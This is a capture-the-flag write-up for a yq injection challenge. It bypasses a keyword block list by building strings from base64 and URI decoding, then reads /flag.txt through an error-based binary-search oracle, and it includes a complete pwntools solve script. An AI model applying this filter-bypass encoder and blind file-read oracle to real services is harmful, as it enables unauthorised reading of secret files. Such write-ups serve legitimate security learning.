---
created: 2026-03-14T22:00
updated: 2026-03-15T01:14
points: 179
solves: 27
---

We are allowed to control the expression in `yq -n [...]`

```python
import subprocess

while expr := input("expr: ").strip():
    if any(bloked in expr for bloked in ['"', ".", "env", "load", "file"]):
        print("blocked")
        continue
    try:
        subprocess.run(["yq", "-n", expr], capture_output=True, timeout=2, check=True)
        print("ok")
    except:
        print("error")
```

We are not allowed quotes, so I need to find a way to make strings.

There is sadly no char code to char function in yq docs.

https://mikefarah.gitbook.io/yq/operators

However I did find something interesting: `tostring`.

It is my only way of generating strings.

There is also `@base64` and `@base64d`, and `@uri` `@urid`.

We could actually generate letters by taking substring of base64 encodings of numbers, but theres always some letters missing, even with repeated base64.

We also need a way to get the empty string to split other strings.

I did however, manage to get `%`.

```
❯ printf "%%" | base64  
JQ==
```

```python
import base64
import secrets

#!/usr/bin/env python3

def main() -> None:
    attempts = 0
    while True:
        attempts += 1
        n = secrets.randbelow(40)
        encoded = base64.b64encode(str(n).encode()).decode()

        s = encoded.lower()
        if "j" in s and "q" in s:
            print(f"number:   {n}")
            print(f"base64:   {encoded}")
            print(f"attempts: {attempts}")
            break

if __name__ == "__main__":
    main()
"""
number:   24
base64:   MjQ=
attempts: 4
"""
```

So now to actually obtain `%`, we do

```python
# i forgot to mention this but
# i spent quite a while to get the empty string too
EMPTY = "(12|tostring|split(1|tostring)as$f|$f[0])"
MjQ = "(24|tostring|@base64)"
PERCENT = f"{MjQ}|split($e) as $s|($s[1]+$s[2]|upcase|@base64d)"
```

I thought of using `uri` because hex is mostly numbers and numbers are cheaper than letter, so its going to be cheaper than base64.

Now we have all the ingredients we can make a payload encoder.

```python
def encode_payload(payload):
    def enc(c):
        if c in string.digits:
            return f"({c}|tostring)"
        else:
            c = hex(ord(c))[2:]
            c1, c2 = c[0], c[1]
            if c1 in string.digits and c2 in string.digits:
                if c1 != "0":
                    return f"($p+({c}|tostring)|@urid)"
                else:
                    return f"($p+(0|tostring)+({c2}|tostring)|@urid)"
            else:
                return f"($p+{enc(c1)}+{enc(c2)}|@urid)"

    payload = "+".join([enc(c) for c in payload])
    payload = f"{EMPTY}as$e|({PERCENT}as$p|(eval({payload})))"
    return payload
```

This just recursively encode all characters into `%DD` uri format, and also making sure both hex digits are `0-9`.

It works!

But how do we read the flag?

`load("/flag.txt")` doesn't print it out or anything, we only know if it errored or not.

I also couldn't find any way to run shell commands.

## boolean oracle

To actually get the flag, I will read the nth character from it, and check if its smaller or equal to some `mid` (I am doing a binary search), I return the result by conditionally erroring.

I found this to throw an error.

```
null[0]
```

There is no ifs so I had to do this

```
expr: {"true":null, "false":[0]}[true]
stdout: null

stderr:
ok
expr: {"true":null, "false":[0]}[false]
stdout: - 0

stderr:
ok
```

However when I tried to wrap behind a bool check it fails to throw errors for some reason.

```python
❯ yq -n '(({"true":null,"false":[0]}[(load("/flag.txt")|split("")[0])=="w"])[0])'
null
❯ yq -n '(({"true":null,"false":[0]}[(load("/flag.txt")|split("")[0])=="w"])[0][0])'
null
❯ yq -n '(({"true":null,"false":[0]}[(load("/flag.txt")|split("")[0])=="w"])[0][0][0])'
null
❯ yq -n '(load("/flag.txt")|split("")[0])=="w"'
true
❯ yq -n 'null[0]'
Error: bad expression, please check expression syntax
```

I then just made it load a non existent file to throw error.

```python
load(({{"true":"bad","false":"/flag.txt"}}[a==b]))
```

And some binary search logic later we have the solve.

```python
import base64
import string

from pwn import *

context.log_level = "error"
EMPTY = "(12|tostring|split(1|tostring)as$f|$f[0])"
MjQ = "(24|tostring|@base64)"
PERCENT = f"{MjQ}|split($e) as $s|($s[1]+$s[2]|upcase|@base64d)"

def encode_payload(payload):
    def enc(c):
        if c in string.digits:
            return f"({c}|tostring)"
        else:
            c = hex(ord(c))[2:]
            c1, c2 = c[0], c[1]
            if c1 in string.digits and c2 in string.digits:
                if c1 != "0":
                    return f"($p+({c}|tostring)|@urid)"
                else:
                    return f"($p+(0|tostring)+({c2}|tostring)|@urid)"
            else:
                return f"($p+{enc(c1)}+{enc(c2)}|@urid)"

    payload = "+".join([enc(c) for c in payload])
    payload = f"{EMPTY}as$e|({PERCENT}as$p|(eval({payload})))"
    return payload

# nc 35.194.108.145 29060
conn = remote("35.194.108.145", 29060)

def query(payload):
    conn.recvuntil(b"expr:")
    conn.sendline(encode_payload(payload).encode())
    r = conn.recvuntil((b"ok", b"error"))
    return b"error" in r

def get_char_at(index):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f'(load("/flag.txt")|split("")[{index}])<=("%{hex(mid)[2:]}"|@urid)'
        expr = f'load(({{"true":"bad","false":"/flag.txt"}}[{cond}]))'
        # print(encode_payload(expr))
        if query(expr):  # error = char <= mid
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)

for i in range(100):
    c = get_char_at(i)
    if c == "}":
        print("}", flush=True)
        break
    print(c, end="", flush=True)
```

```flag
tkbctf{s0_wh4t'5_th3_n3x7_1nj3c710n_ch4ll3ng3?}
```
